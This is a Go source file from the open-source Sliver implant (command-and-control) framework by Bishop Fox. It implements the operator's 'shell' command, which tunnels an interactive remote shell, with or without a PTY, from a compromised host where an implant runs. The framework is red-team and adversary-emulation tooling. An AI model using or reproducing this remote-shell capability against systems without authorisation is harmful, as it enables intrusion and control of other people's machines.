package command

/*
	Sliver Implant Framework
	Copyright (C) 2019  Bishop Fox

	This program is free software: you can redistribute it and/or modify
	it under the terms of the GNU General Public License as published by
	the Free Software Foundation, either version 3 of the License, or
	(at your option) any later version.

	This program is distributed in the hope that it will be useful,
	but WITHOUT ANY WARRANTY; without even the implied warranty of
	MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
	GNU General Public License for more details.

	You should have received a copy of the GNU General Public License
	along with this program.  If not, see <https://www.gnu.org/licenses/>.
*/

import (
	"fmt"
	"io"
	"log"
	"os"

	"github.com/bishopfox/sliver/client/core"
	sliverpb "github.com/bishopfox/sliver/protobuf/sliver"

	"github.com/desertbit/grumble"
	"github.com/golang/protobuf/proto"
	"golang.org/x/crypto/ssh/terminal"
)

const (
	windows = "windows"
)

func shell(ctx *grumble.Context, server *core.SliverServer) {
	if ActiveSliver.Sliver == nil {
		fmt.Printf(Warn + "Please select an active sliver via `use`\n")
		return
	}

	if !isUserAnAdult() {
		return
	}

	shellPath := ctx.Flags.String("shell-path")
	noPty := ctx.Flags.Bool("no-pty")
	if ActiveSliver.Sliver.OS == windows {
		noPty = true // Windows of course doesn't have PTYs
	}

	fmt.Printf(Info + "Opening shell tunnel (EOF to exit) ...\n\n")

	tunnel, err := server.CreateTunnel(ActiveSliver.Sliver.ID, defaultTimeout)
	if err != nil {
		log.Printf(Warn+"%s", err)
		return
	}

	shellReqData, _ := proto.Marshal(&sliverpb.ShellReq{
		SliverID:  ActiveSliver.Sliver.ID,
		EnablePTY: !noPty,
		TunnelID:  tunnel.ID,
		Path:      shellPath,
	})
	resp := <-server.RPC(&sliverpb.Envelope{
		Type: sliverpb.MsgShellReq,
		Data: shellReqData,
	}, defaultTimeout)
	if resp.Err != "" {
		fmt.Printf(Warn+"Error: %s", resp.Err)
		return
	}

	var oldState *terminal.State
	if !noPty {
		oldState, err = terminal.MakeRaw(0)
		log.Printf("Saving terminal state: %v", oldState)
		if err != nil {
			fmt.Printf(Warn + "Failed to save terminal state")
			return
		}
	}

	// readBuf := make([]byte, 128)

	cleanup := func() {
		log.Printf("[client] cleanup tunnel %d", tunnel.ID)
		tunnelClose, _ := proto.Marshal(&sliverpb.ShellReq{
			TunnelID: tunnel.ID,
		})
		server.RPC(&sliverpb.Envelope{
			Type: sliverpb.MsgTunnelClose,
			Data: tunnelClose,
		}, defaultTimeout)
		if !noPty {
			log.Printf("Restoring old terminal state: %v", oldState)
			terminal.Restore(0, oldState)
		}
	}

	go func() {
		defer cleanup()
		_, err := io.Copy(os.Stdout, tunnel)
		if err != nil {
			fmt.Printf(Warn+"error write stdout: %v", err)
			return
		}
	}()
	for {
		_, err := io.Copy(tunnel, os.Stdin)
		if err == io.EOF {
			break
		}
		if err != nil {
			fmt.Printf(Warn+"error read stdin: %v", err)
			break
		}
	}
	// terminal.Restore(0, oldState)
}
